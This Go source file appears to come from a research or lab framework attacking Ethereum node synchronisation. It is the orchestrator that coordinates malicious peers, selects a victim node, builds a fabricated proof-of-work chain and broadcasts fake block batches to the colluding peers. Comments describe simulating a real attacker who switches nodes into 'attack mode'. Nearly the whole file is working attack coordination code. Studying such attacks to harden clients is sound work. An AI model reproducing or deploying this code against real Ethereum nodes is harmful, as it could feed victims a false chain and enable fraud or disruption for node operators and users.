package orchestrator

import "fmt"
import "net"
import "time"
import "sync"
import "math"
import "bytes"
import "encoding/binary"
import "os"
import dircopy "github.com/otiai10/copy"
import "github.com/ethereum/go-ethereum/rlp"
import "github.com/ethereum/go-ethereum/core/types"
import "github.com/ethereum/go-ethereum/attack/buildchain"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
	SEED_ADDR = "localhost"
)
var (
	port = "45678"
	seed_port = "65432"
	mgethDir string
)

type Orchestrator struct {
	peerset *PeerSet
	quitCh chan struct{}
	errc chan error
	incoming chan *peerMessage
	victim string
	attackPhase utils.AttackPhase
	chainBuilt bool
	firstMasterSet bool
	mu sync.Mutex
	syncCh chan struct{}
	masterPeerSet bool
	done chan struct{}
}

type OrchConfig struct {
	Port string
	AtkMode string
	Fraction float64
	HonestHashrate float64
}

func New(errc chan error) *Orchestrator {
	o := &Orchestrator {
		peerset: &PeerSet{
			peers: make(map[string]*Peer),
		},
		quitCh: make(chan struct{}),		// Useless (?) for now as termination upon success/fail is signaled
											// through errc channel
		errc: errc,
		incoming: make(chan *peerMessage),
		attackPhase: utils.StalePhase,
		chainBuilt: false,
		firstMasterSet: false,
		syncCh: make(chan struct{}),
		masterPeerSet: false,
		done: make(chan struct{}),
	}

	return o
}

func (o *Orchestrator) Start(cfg *OrchConfig) {
	go o.handleMessages()
	go o.addPeers(cfg.Port)

	if cfg.HonestHashrate >= 0 {
		buildchain.SetHashrateLimit(int64(math.Round(cfg.Fraction * cfg.HonestHashrate)))
	} else {
		buildchain.SetHashrateLimit(-1)
	}

	fmt.Println("Orchestrator started")
}

func (o *Orchestrator) addPeers(port string) {
	l, err := net.Listen("tcp", ADDR+":"+port)
	if err != nil {
		fmt.Println("Error listening on the network")
		o.errc <- err
		return
	}
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting new connection\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		buf := make([]byte, 8)
		_, err = conn.Read(buf)
		if err != nil {
			fmt.Println("Error receiving peer's ID\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		peerId := string(buf[:])
		peer := &Peer {
			id: peerId,
			conn: conn,
			stop: make(chan struct{}),
		}

		o.peerset.add(peerId, peer)
		fmt.Println("Peer " + peerId + " joined (numPeers:", o.peerset.len(), "\b)")

		go func() {
			peer.readLoop(o.incoming, o.quitCh, o.errc)
			o.peerset.remove(peerId)
		}()
		
		err = o.initPeer(peer)
		if err != nil {
			fmt.Println("Could not initialize peer correctly")
			o.peerset.remove(peerId)
			continue
		}

		/*
		Here, we arbitrarily choose to make the attack start after bootingTime seconds from when the two
		malicious peers are ready. In other words, the attacker doesn't look for a victim in the first
		bootingTime seconds. This simulates the fact that a real attacker has its Ethereum nodes in
		standard operation and at some point, later on, he switches them to "attack mode".
		When this happens, one of the two will stop accepting new peers from the network until a victim
		is picked: this is another reason why we want to keep both nodes in "normal operation" at the
		beginning, i.e. to establish some peering connections to other honest nodes.
		*/
		bootingTime := 5*time.Second
		if o.peerset.len() >= 1 && o.attackPhase==utils.StalePhase {
			go func() {
				time.Sleep(bootingTime)
				o.attackPhase = utils.ReadyPhase
				err = o.sendAll(msg.SetAttackPhase.SetContent([]byte{byte(o.attackPhase)}))
				if err != nil {
					fmt.Println("Could not notify start of the attack")
					o.close()
					o.errc <- err
					return
				}
				o.leadAttack()
			}()
		}
	}

}

func (o *Orchestrator) leadAttack() {
	fmt.Println("Attack ready to go")
	defer o.close()

	// --- SYNC PHASE ---

	for (!o.masterPeerSet) {
		time.Sleep(100*time.Millisecond)
	}
	err := o.send(o.peerset.masterPeer, msg.GetCwd)
	if err != nil {
		fmt.Println("Couldn't get current working directory of master peer")
		o.errc <- err
		return
	}
	bp, err := buildchain.GenerateBuildParameters()
	if err != nil {
		fmt.Println("Could not generate build parameters for fake chain")
		o.errc <- err
		return
	}

	buildchain.SetSeals(bp.SealsMap)
	buildchain.SetTimestampDeltas(bp.TimestampDeltasMap)

	errc := make(chan error)
	results := make(chan types.Blocks)
	go func() {
		for !buildchain.GhostRootSet() {
			time.Sleep(100*time.Millisecond)
		}
		fmt.Println("Ghost root set")

		<-o.syncCh		// Wait for copying peer's database to buildchain before calling it.

		errc <- buildchain.BuildChain(utils.FakeChain, 128, false, 0, true, false, results) 
	}()

	loop:
	for {
		select {
		case result := <-results:
			errb := o.broadcastFakeBatch(result)
			if errb != nil {
				o.errc <- errb
				return
			}
		case err := <-errc:
			if err != nil {
				fmt.Println("Couldn't build fake chain")
				o.errc <- err
				return
			}
			break loop
		}
	}
	select {
		case result := <-results:
			errb := o.broadcastFakeBatch(result)
			if errb != nil {
				o.errc <- errb
				return
			}
		default:
	}
	close(results)
	close(errc)

	// Simulate delay
	time.Sleep(8*time.Minute)
	err = o.sendAll(msg.FakeBatch.SetContent(nil))
	if err != nil {
		fmt.Println("Couldn't notify end of fake batches")
		o.errc <- err
		return
	}




	// --- DELIVERY PHASE ---

	<-o.done 	// Wait for the attack to finish
	o.close()
	o.errc <- nil
}


func (o *Orchestrator) broadcastFakeBatch(blocks types.Blocks) error {
	rlpBlocks, err := rlp.EncodeToBytes(blocks)
	if err != nil {
		fmt.Printf("Couldn't RLP-encode fake batch #%d - #%d\n", blocks[0].NumberU64(), blocks[len(blocks)-1].NumberU64())
		return err
	}
	content := make([]byte, 4)
	binary.BigEndian.PutUint32(content, uint32(len(blocks)))
	content = append(content, rlpBlocks...)
	err = o.sendAll(msg.FakeBatch.SetContent(content))
	if err != nil {
		fmt.Println("Couldn't broadcast fake batch to malicious peers")
		return err
	}
	return nil
}

func (o *Orchestrator) handleMessages() {
	for {
		select {
		case <- o.quitCh:
			return

		case peermsg := <-o.incoming:
			message := peermsg.message
			sender := peermsg.peer
			//fmt.Println("New message, code:", message.Code)

			switch message.Code {
			case msg.MasterPeer.Code:
				o.peerset.masterPeer = sender
				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
				o.masterPeerSet = true
			case msg.SetVictim.Code:
				o.masterPeerSet = false
				victimID := string(message.Content)
				if o.victim == "" {
					o.victim = victimID
					fmt.Println("Found new victim: " + victimID)
				} else if o.victim != victimID {
					fmt.Println("Something wrong happened setting victim ID: oldID = " + o.victim + ", newID = "+ victimID)
					o.errc <- utils.ParameterErr
					o.close()
					return
				}
				go func() {
					for !o.masterPeerSet {
						time.Sleep(10*time.Millisecond)
					}
				}()
			case msg.SetAttackPhase.Code:
				attackPhase := utils.AttackPhase(message.Content[0])
				if attackPhase != o.attackPhase {
					o.attackPhase = attackPhase
					fmt.Println("Started", o.attackPhase, "phase")
				}
			case msg.OriginalHead.Code:
				size := uint64(len(message.Content))
				s := rlp.NewStream(bytes.NewReader(message.Content), size)
				head := new(types.Header)
				if err := s.Decode(head); err != nil {
					fmt.Println("Couldn't decode original head")
					o.errc <- err
					o.close()
					return
				}
				buildchain.SetOriginalHead(head)
				go func() {
					height := head.Number.Uint64()
					fmt.Printf("Pre-building DAG at block #%d in background\n", height)
					err := buildchain.PrebuildDAG(height)
					if err != nil {
						fmt.Println("Pre-building DAG failed")
						o.errc <- err
						o.close()
						return
					}
					fmt.Printf("Pre-built DAG at block #%d\n", height)
				}()
				go func() {
					// Wait for ghost root, otherwise peer's database may undergo write operations while
					// copying it to buildchain directory, resulting in an inconsistent state
					for !buildchain.GhostRootSet() {
						time.Sleep(time.Second)
					}

					separator := string(os.PathSeparator)
					srcPath := mgethDir + separator + "datadir" + separator + "geth" + separator + "chaindata"
					home, err := os.UserHomeDir()
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
					fakeChainDbPath := home + separator + ".buildchain" + separator + utils.FakeChain.GetDir()
					err = os.RemoveAll(fakeChainDbPath)
					if err != nil {
						fmt.Println("Couldn't clean fake chain DB directory")
						o.errc <- err
						o.close()
						return
					}
					err = dircopy.Copy(srcPath, fakeChainDbPath)
					if err != nil {
						fmt.Println("Couldn't copy peer's chaindata to buildchain directory")
						o.errc <- err
						o.close()
						return
					}
					fmt.Println("Peer's database copied into buildchain tool")
					o.syncCh <- struct{}{}

				}()
			case msg.Cwd.Code:
				mgethDir = string(message.Content)
				buildchain.SetMgethDir(mgethDir)
			case msg.GhostRoot.Code:
				buildchain.SetGhostRoot(message.Content)
			case msg.EndOfAttack.Code:
				o.done <- struct{}{}


			// Default policy: relay the message among peers if no particular action by the orch is needed
			default:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			}
		}
	}
}

func (o *Orchestrator) Wait() {
	<-o.quitCh
	return
}

func (o *Orchestrator) initPeer (p *Peer) error {
	for id, _ := range o.peerset.peers {
		err := o.send(p, msg.NewMaliciousPeer.SetContent([]byte(id)))
		if err != nil {
			return err
		}
	}

	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, utils.NumBatchesForPrediction)
	err := o.send(p, msg.SetNumBatches.SetContent(buf))
	if err != nil {
			return err
		}

		/*
	o.mu.Lock()
	if o.firstMasterSet {
		err = o.send(p, msg.AvoidVictim.SetContent([]byte{1}))
	} else {
		o.firstMasterSet = true
	}
	o.mu.Unlock()
	*/
	return err
}

func (o *Orchestrator) send(p *Peer, message *msg.Message) error {
	buf := message.Encode()
	n, err := p.conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

func (o *Orchestrator) sendAllExcept(message *msg.Message, toExclude *Peer) error {
	for _, peer := range o.peerset.peers {
		if peer.id == toExclude.id {
			continue
		}
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) sendAll(message *msg.Message) error {
	for _, peer := range o.peerset.peers {
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) close() {
	o.sendAll(msg.Terminate)
	close(o.quitCh)
	close(o.incoming)
	close(o.done)
	o.peerset.close()
	return
}

func (o *Orchestrator) Close() {
	o.close()
}


